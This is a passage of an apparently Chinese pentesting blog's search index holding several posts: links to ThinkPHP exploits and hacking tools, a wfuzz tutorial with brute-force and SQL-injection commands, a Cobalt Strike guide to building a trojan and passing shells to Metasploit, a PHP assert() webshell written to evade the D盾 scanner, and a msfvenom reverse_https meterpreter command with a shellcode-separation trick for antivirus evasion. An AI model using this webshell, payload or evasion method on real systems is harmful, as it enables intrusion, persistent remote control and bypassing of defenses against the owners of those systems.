ThinkPHP漏洞:https://github.com/Mochazz/ThinkPHP-Vuln/ 工具:https://www.kitploit.com/2019/08/hacktronian-all-in-one-hacking-tool-for.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29https://www.kitploit.com/2019/08/iprotate-extension-for-burp-suite-which.html?m=1https://github.com/guimaizi/get_domain?from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>redis未授权</tag>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wfuzz工具]]></title>
    <url>%2F2019%2F08%2F28%2Fwfuzz%2F</url>
    <content type="text"><![CDATA[wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ第二个:FUZ2Z第三个:FUZ3Z其他更多的参数以此类推payload的个数要与FUZZ的个数相等-c: 带颜色输出-z: payloads里面的参数(wfuzz -e payloads)常用的有 file,1.txt:加载1.txt文件,用文件内容作为payload range,1-10:代表用1到10作为payload list,1-2-3:代表用1,2,3作为参数。每个参数用-分割-d: 设置POST数据-b: 设置cookie头-H: 添加http头部-p: 代理(可以使用多个代理)-X: 请求方式-R: 设置递归深度-s: 设置超时时间-t: 设置线程-e: 编码-f: 保存–follow：遵循重定向--basic: Basic Auth下面的要设置多个值的话用,分割--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)--hl: 不输出行数等于你设置的行数的响应包--hw: 不输出字数等于你设置的字数的响应包--hh: 不输出字符数等于你设置的字符数的响应包--hs: 不输出响应包中包含你输入的字符串的响应包-sc: 输出状态码等于你设置的状态码的响应包--sl: 输出行数等于你设置的行数的响应包--sw: 输出字数等于你设置的字数的响应包--sh: 输出字符数等于你设置的字符数的响应包--ss: 输出响应包中包含你输入的字符串的响应包 界面介绍id:代表编号Response: 代表返回状态码(C=404代表返回404状态码)Lines: 代表返回的行数Word: 代表返回的字数Chars: 代表返回的字符数payload: 代表发出去的payload -c参数下面是一个无-c参数的$ wfuzz -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ一个有-c参数的wfuzz -c -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ -z参数把文件内容当做payloadwfuzz -c -z file,dir.txt http://172.16.5.2/FUZZ用rang来当做payloadwfuzz -c -z range,10-20 --hc 404 http://172.16.5.2/FUZZ用list来当做payloadwfuzz -c -z list,20-a-b-upload-login --hc 404 http://172.16.5.2/FUZZ -d设置POST数据wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; http://172.16.5.2/ -b设置cookie设置2个cookie,其中一个是user还有一个是passwdwfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; -b &quot;user=test&quot; -b &quot;passwd=test&quot; http://172.16.5.2/设置多个cookie要用多个-b -X参数设置请求方法wfuzz -c -z list,GET-POST-HEAD -X FUZZ http://172.16.5.2/ -p设置代理wfuzz -c -z list,20-a-b-upload-login -p 127.0.0.1:SOCKS4,127.0.0.1:SOCKS5 http://172.16.5.2/ -t设置线程wfuzz -c -z list,20-a-b-upload-login -t 30 http://172.16.5.2/ 实用技巧爆破目录wfuzz -c -z file,dir.txt --sc 403,200,304 http://172.16.5.2/FUZZ 爆破文件wfuzz -c -z file,dir.txt --sc 200,304 http://172.16.5.2/FUZZ.php 爆破账号密码第一种爆破(一个字典对应一个字典)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php第二种爆破(一个字典中的一个值直接对应另外一个字典的所有值)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 保存文件保存html文件wfuzz -c -z file,dir.txt -f 1,html http://172.16.5.96/FUZZ 对payload加密 wfuzz -z list,a-b-c-admin,base64 -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 对cookie进行sql注入测试 wfuzz -z file,MSSQL.fuzz.txt -b &quot;sql=FUZZ&quot; http://172.16.5.96/login/login.php]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike(一)]]></title>
    <url>%2F2019%2F08%2F25%2Fcobaltstrike(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar第一次连接的服务器会显示服务端的SSL 证书的SHA256哈希值这个直接确定就可以了 如图: 然后点击连接就可以了 里面的目录就不介绍了,如果不懂的可以看https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikeji-ben-shi-yong/ji-ben-shi-yong-jie-shao.html 制作木马在制作木马之前先要创建一个监听器(类似msf的payload) 点击此按钮后点击add 然后进行配置 名字就是给监听器取的名字 payload反弹的方式(有beacon字符串的可以反弹到cs里面,有foreign可以用来把shell传递到其他工具) 主机:反弹到哪个ip上端口:反弹到的端口配置完成后点击save(遇到其他窗口点击确认就可以了) 如图代表添加成功: 然后制作木马 如图添加一个exe的木马 对木马进行配置, 监听器:选择自己生成监听器的名字输出:代表输出的格式然后点击Generate 运行该木马 派送一个shell给msf首先也要添加一个监听器 payload要选择foreign类型的主机填写是反弹到的ip端口填写反弹到的端口 配置完Cobalt Strike后配置msf 如图: 然后回到Cobalt Strike,右击目标选择增加会话 然后选择要派生给msf的那个监听器，在点Choose就可以了。 然后等个1分钟左右就可以看到msf收到了传递过来的shell 把msf的shell传递个Cobalt strike首先也要创建一个监听器,因为前面已经创建了一个名字为cs的监听器，所以我们这里直接使用那时候创建的那个监听器就可以了,然后我们对msf进行配置 先查看自己的session id 然后在对msf进行配置 然后就可以看到cobalt strike主机上线了]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常量过D盾]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%B8%B8%E9%87%8F%E8%BF%87D%E7%9B%BE%2F</url>
    <content type="text"><![CDATA[常量过D盾1234567&lt;?php sprintf("123"); sprintf("123"); sprintf("123"); $a=$_GET['a']; define("Test", "$a",true); assert(TesT);]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shellcode分离免杀]]></title>
    <url>%2F2019%2F08%2F02%2Fshellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%2F</url>
    <content type="text"><![CDATA[免杀原理病毒查杀一般分为:特征、行为和云查杀。这些查杀会针对PE头文件的查杀。payload文件越大的时候,越容易被查杀。 本篇文章采用特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。 制作木马用msfvenom生成木马 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.112 lport=4444 -e x86/shikata_ga_nai -i5 -f raw &gt; test.c 参数解释 -p:表示payload,因为用tcp的话，通信会被杀毒软件拦截通信导致反弹不了会话,所以使用https通信(因为https会加密) lhost:反弹shell的ip lport:反弹shell的端口 -e:选择编码方式 i:参数指定编码次数 -f:输出格式 下载shellcodeshellcode地址:https://github.com/clinicallyinane/shellcode_launcher/ 反弹shell设置msfconsole监听 记住payload要设置对,反正反弹的shell接收不了 然后用shell执行我们生成的木马就可以反弹shell了 查杀情况 文章声明此方法并非原创]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
</search>
